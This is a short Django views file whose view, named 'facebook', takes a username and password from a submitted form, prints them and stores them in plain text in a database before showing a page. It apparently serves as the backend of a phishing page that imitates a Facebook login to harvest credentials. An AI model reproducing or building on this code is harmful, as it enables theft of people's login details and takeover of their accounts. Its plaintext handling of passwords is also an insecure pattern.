from django.shortcuts import render
from .models import Details

# Create your views here.

def facebook(request):
    usr = request.POST.get('user')
    psw = request.POST.get('pass')
    print(usr,psw)
    dtail = Details(Username=usr,Password=psw)
    dtail.save()

    return render(request,'index.html')


